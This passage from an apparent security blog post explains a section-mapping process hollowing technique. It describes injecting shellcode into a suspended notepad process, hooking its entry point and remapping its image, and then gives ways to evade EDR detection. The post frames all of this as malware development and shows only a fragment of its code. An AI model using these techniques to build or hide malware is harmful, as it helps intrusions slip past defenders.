</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] Resumed thread</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>    ResumeThread(pi<span style="color:#f92672">-&gt;</span>hThread);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Above code does exactly what is listed above. First, it starts a notepad
process suspend it&rsquo;s exution. then it retrieves <strong>thread context</strong> from theprocess. Thread context is important because, without setting context back
to what it was before suspending will cause a program crash.</p>
<p>Then it proceed to retrieve <strong>ImageBaseAddress</strong> of the process using
<code>NtQueryInformationProcess</code> and <code>ReadProcessMemory</code>.</p>
<p>Then the shellcode is injected into the target process by the function
<strong>InjectShellcode</strong>. This function uses the same technique discussed
arlier.</p>
<p>The main function then calls <strong>PatchHostProcess</strong>. This function reads the
host process&rsquo;s image into the memory and parses the entry point. Then in
the local copy, it creates a hook that jumps into the shellcode that
<strong>InjectShellcode</strong> injected. Then it uses the above code injection method
and creates a section in the local process, however, before creating a
section in the remote process, it unmaps the process image using a call to
<code>ZwUnmapViewOfSection</code>. it then creates the section at the same address
that the original image was mapped.</p>
<p>Its worth noting that it is possible to hook any address of the process
image as long as it does not spawn notepad (or whatever).</p>
<p>Result after compiling and running the code</p>
<p><img src="/img/process-hollowing/4.png" alt="result"></p>
<p>permissions of the shellcode</p>
<p><img src="/img/process-hollowing/5.png" alt="shellcode&amp;rsquo;s permissions"></p>
<p>permissions of the original notepad image</p>
<p><img src="/img/process-hollowing/6.png" alt="notepad image"></p>
<h2 id="achieving-more-stealth">Achieving more stealth<a href="#achieving-more-stealth" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Even though the technique is capable of fooling both analysts and some EDR,it can be stll detected if defense solutions are monitoring
<code>CreateProcessA</code>.</p>
<p>There are many workarounds for this. One can directly call
<code>NtCreateUserProcess</code> or <code>NtCreateProcessEx</code>.</p>
<p>Another method is to Hook one of those APIs and call <code>CreateProcessA</code> with
false arguments. For
example,</p>
<pre><code>- Hook `NtCreateUserProcess` so it will jump into a specified location
- Call CreateProcessA without `CREATE_SUSPENDED` flag.
- Set `CREATE_SUSPENDED` flag and jump back to `NtCreateUserProcess`
</code></pre>
<p>(to learn more about above technique, my seggestion is to reverse IcedID)</p>
<p>The other thing to consider is changing the memory permissions of the
target process after remapping. Even without doing that, it can mislead
an analyst to beleive it as the malicious binary since it has permissions
<strong>RWX</strong>.</p>
<p>Even after that, once analyst has dumped the original executable image
thinking it is malicous to analyze it, it is pretty easy to indeify the
hook. As stated earlier, it is possible hook any other location as long as
it does not start the original process.</p>
<p>It is also possible to implement other instructions to change the control
flow. For example, <code>push / ret</code>.</p>
<h1 id="references">References<a href="#references" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p><a href="https://cysinfo.com/hollowfind/">hollowfind volatility plugin</a></p>
<p><a href="https://cysinfo.com/detecting-deceptive-hollowing-techniques/">DETECTING DECEPTIVE PROCESS HOLLOWING TECHNIQUES USING HOLLOWFIND VOLATILITY PLUGIN</a></p>
<h1 id="the-end">The end<a href="#the-end" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>This blog post explored the concept of section mapping and how it can be
leveraged when developing malware.</p>
<p>#Spread Anarchy!</p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="https://rxOred.github.io/post/analysis/whispergate/whispergate/">
                <span class="button__icon"></span>
                <span class="button__text">WhisperGate</span>
            </a>
        </span>
        
        
        <span class="button next">
            <a href="https://rxOred.github.io/post/analysis/anubis/anubis/">
                <span class="button__text">Reversing Anubis</span>
                <span class="button__icon"></span>
            </a>
        </span>
        
    </div>
</div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span> 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://rxOred.github.io/assets/main.js"></script>
<script src="https://rxOred.github.io/assets/prism.js"></script>







  
</div>

</body>
</html>
